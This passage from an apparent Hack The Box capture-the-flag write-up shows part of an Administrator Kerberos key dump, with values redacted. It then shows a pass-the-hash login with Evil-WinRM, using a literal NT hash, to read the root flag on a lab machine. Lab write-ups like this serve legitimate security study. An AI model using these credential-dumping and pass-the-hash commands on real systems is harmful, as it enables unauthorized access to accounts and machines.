Administrator:0x14: HTB{REDACTED_HASH}
Administrator:0x13: HTB{REDACTED_HASH}
Administrator:aes256-cts-hmac-sha1-96: HTB{REDACTED_HASH}
Administrator:aes128-cts-hmac-sha1-96: HTB{REDACTED_HASH}
Administrator:0x17: HTB{REDACTED_HASH}
[*] Cleaning up... 
```

Now Pass-the-hash with [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) and read the root flag:

```bash
evil-winrm -i 10.10.10.95 -u "Administrator" -H :0b133be956bfaddf9cea56701affddec

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
 HTB{REDACTED_FLAG}
```

Pwned !!